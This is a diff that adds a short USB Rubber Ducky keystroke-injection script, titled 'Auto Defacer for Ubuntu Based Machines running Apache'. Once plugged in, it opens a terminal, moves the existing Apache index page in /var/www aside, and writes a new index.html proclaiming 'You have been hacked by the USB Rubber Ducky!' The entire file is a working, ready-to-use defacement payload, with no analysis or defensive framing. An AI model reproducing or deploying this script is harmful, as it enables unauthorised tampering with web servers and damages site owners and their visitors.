@@ -1,0 +1,25 @@
+REM Auto Defacer for Ubuntu Based Machines running Apache.
+REM Author: Xcellerator
+REM Description: Automatically defaces index page of an apache web server.
+DEFAULT_DELAY 200
+ALT F2
+STRING terminal
+ENTER
+STRING cd /var/www
+ENTER
+STRING mv index.* index.bak
+ENTER
+STRING touch index.html
+ENTER
+STRING nano index.html
+ENTER
+STRING <marquee><h1>You have been hacked by the USB Rubber Ducky!</h1></marquee>
+ENTER
+STRING <center><a href="http://www.usbrubberducky.com/"><img src="http://cdn.shopify.com/s/files/1/0068/2142/products/usbducky2.jpg" /></a><center>
+ENTER
+STRING <center><h5>You're old index page can be found <a href="./index.bak">here.</a></h5></center>
+CONTROL x
+STRING y
+ENTER
+STRING exit
+ENTER
